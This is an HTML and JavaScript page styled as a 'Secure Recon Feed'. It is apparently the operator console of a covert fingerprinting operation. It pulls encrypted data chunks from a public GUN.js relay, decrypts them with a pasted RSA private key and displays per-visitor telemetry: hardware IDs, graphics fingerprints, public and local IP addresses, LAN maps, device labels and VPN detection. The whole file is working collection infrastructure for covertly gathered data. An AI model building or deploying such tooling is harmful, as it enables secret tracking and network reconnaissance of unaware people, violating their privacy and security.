 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>c43br3c5 // Secure Intel List</title>
    <script src="https://cdn.jsdelivr.net/npm/gun/gun.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; line-height: 1.4; }
        .entry { border: 1px solid #0f0; padding: 15px; margin-bottom: 30px; background: #050505; }
        .data-row { display: block; border-bottom: 1px solid #111; padding: 4px 0; }
        .label { color: #888; font-weight: bold; text-transform: uppercase; margin-right: 10px; }
        .value { color: #0f0; white-space: pre-wrap; word-break: break-all; }
        h1 { border-bottom: 2px solid #0f0; }
        
        /* Auth UI Styles */
        #auth-section { margin-bottom: 20px; border: 1px dashed #0f0; padding: 20px; }
        textarea { width: 100%; max-width: 600px; height: 150px; background: #111; color: #0f0; border: 1px solid #0f0; font-family: monospace; padding: 10px; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0c0; }
        #error-msg { color: #f00; margin-top: 10px; font-weight: bold; }
        .progress { color: #ffeb3b; font-size: 0.9em; margin-bottom: 10px; border-bottom: 1px dashed #ffeb3b; padding-bottom: 5px; }
    </style>
</head>
<body>
    <h1>[ SECURE RECON FEED ]</h1>

    <div id="auth-section">
        <p>SYSTEM LOCKED. INSERT RSA PRIVATE KEY (PKCS#8) TO DECRYPT MESH FEED:</p>
        <textarea id="private-key" placeholder="-----BEGIN PRIVATE KEY-----..."></textarea><br>
        <button id="unlock-btn">DECRYPT FEED</button>
        <div id="error-msg"></div>
    </div>

    <div id="feed" style="display: none;"></div>

    <script>
        const feed = document.getElementById('feed');
        const authSection = document.getElementById('auth-section');
        const unlockBtn = document.getElementById('unlock-btn');
        const errorMsg = document.getElementById('error-msg');
        let rsaPrivateKeyPem = "";

        // Memory buffer to hold incoming chunks
        const sessionBuffers = {};

        // --- CRYPTO HELPERS ---
        function base64ToArrayBuffer(base64) {
            const binaryString = window.atob(base64);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        }

        function pemToArrayBuffer(pem) {
            const b64Lines = pem.replace(/(-----(BEGIN|END) PRIVATE KEY-----|\s)/g, '');
            return base64ToArrayBuffer(b64Lines);
        }

        async function decryptPayload(encryptedPackage, pemKey) {
            try {
                if (!encryptedPackage || !encryptedPackage.key || !encryptedPackage.iv || !encryptedPackage.content) {
                    return null;
                }

                const privateKey = await crypto.subtle.importKey(
                    "pkcs8",
                    pemToArrayBuffer(pemKey),
                    { name: "RSA-OAEP", hash: "SHA-256" },
                    false,
                    ["unwrapKey"]
                );

                const wrappedKeyBuffer = base64ToArrayBuffer(encryptedPackage.key);
                const aesKey = await crypto.subtle.unwrapKey(
                    "raw",
                    wrappedKeyBuffer,
                    privateKey,
                    { name: "RSA-OAEP" },
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );

                const ivBuffer = base64ToArrayBuffer(encryptedPackage.iv);
                const dataBuffer = base64ToArrayBuffer(encryptedPackage.content);
                
                const decryptedBuffer = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: ivBuffer },
                    aesKey,
                    dataBuffer
                );

                const decoder = new TextDecoder();
                return JSON.parse(decoder.decode(decryptedBuffer));
            } catch (err) {
                // Fails silently for non-targeted or malformed nodes
                return null;
            }
        }

        // --- UI & GUN.JS LOGIC ---
        const fieldOrder = [
            "title", "complexityScore", "detectedType", "hardwareID", "natTopology", 
            "automatedBot", "multipleNICs", "networkSpeed",
            "webgpuFingerprint", "webglFingerprint",
            "hardwareVideoDecoders", "deepMediaTelemetry", 
            "hardwareDevices", "deviceLabels", "publicIPs", "localIPs", 
            "userAgentHints", "userAgentClassic", "hardwareAdapterFingerprint", 
            "vpnProxyTunnel", "lan_map_fetch", "lan_map_timing", 
            "capturedAt", "url", "timestamp"
        ];

        function renderPayload(sessionId, data) {
            let entry = document.getElementById(`entry-${sessionId}`);
            if (!entry) {
                entry = document.createElement('div');
                entry.id = `entry-${sessionId}`;
                entry.className = 'entry';
                feed.prepend(entry);
            }

            let html = `<div style="color:#0f0; margin-bottom:10px;">>>> SESSION_ID: ${sessionId} [REASSEMBLED & DECRYPTED]</div>`;
            fieldOrder.forEach(key => {
                if (data[key] !== undefined) {
                    html += `<div class="data-row">
                                <span class="label">${key.replace(/([A-Z])/g, ' $1')}:</span>
                                <span class="value">${data[key]}</span>
                             </div>`;
                }
            });
            entry.innerHTML = html;
            
            // Remove the progress indicator if it exists
            const progressIndicator = document.getElementById(`prog-${sessionId}`);
            if(progressIndicator) progressIndicator.remove();
        }

        function updateProgressUI(sessionId, received, total) {
            let prog = document.getElementById(`prog-${sessionId}`);
            if (!prog) {
                prog = document.createElement('div');
                prog.id = `prog-${sessionId}`;
                prog.className = 'progress';
                feed.prepend(prog);
            }
            prog.innerText = `>>> INCOMING SESSION: ${sessionId} [${received}/${total} Chunks Decrypted]`;
        }

        function startGunMesh() {
            // UPDATED PEER URL
            const gun = Gun(['https://gun-vue.net/gun']);
            
            // MAP DEEP: Namespace -> HWID -> SessionID -> Pieces
            gun.get('very-exhilirated-mouse-moot-skyblue-hell').map().map().map().on(async (encryptedPiece, pieceId) => {
                
                const piece = await decryptPayload(encryptedPiece, rsaPrivateKeyPem);
                if (!piece || !piece.sid) return; 

                const { sid, idx, total, data } = piece;

                // Initialize buffer for new session
                if (!sessionBuffers[sid]) {
                    sessionBuffers[sid] = {
                        chunks: new Array(total),
                        receivedCount: 0,
                        isComplete: false
                    };
                }

                // If chunk is new, add it to the specific index (handles out-of-order delivery)
                if (!sessionBuffers[sid].chunks[idx]) {
                    sessionBuffers[sid].chunks[idx] = data;
                    sessionBuffers[sid].receivedCount++;
                    
                    if (!sessionBuffers[sid].isComplete) {
                        updateProgressUI(sid, sessionBuffers[sid].receivedCount, total);
                    }
                }

                // Reassembly check
                if (sessionBuffers[sid].receivedCount === total && !sessionBuffers[sid].isComplete) {
                    sessionBuffers[sid].isComplete = true;
                    try {
                        const fullString = sessionBuffers[sid].chunks.join('');
                        const finalPayload = JSON.parse(fullString);
                        renderPayload(sid, finalPayload);
                    } catch (e) {
                        console.error(`[-] Failed to parse reassembled payload for session ${sid}:`, e);
                    }
                }
            });
        }

        // Handle Unlock Button
        unlockBtn.addEventListener('click', () => {
            const inputKey = document.getElementById('private-key').value.trim();
            if (inputKey.includes("BEGIN PRIVATE KEY")) {
                rsaPrivateKeyPem = inputKey;
                authSection.style.display = "none";
                feed.style.display = "block";
                startGunMesh(); 
            } else {
                errorMsg.innerText = "ERROR: Invalid Key Format. Must be PKCS#8.";
            }
        });
    </script>
</body>
</html>
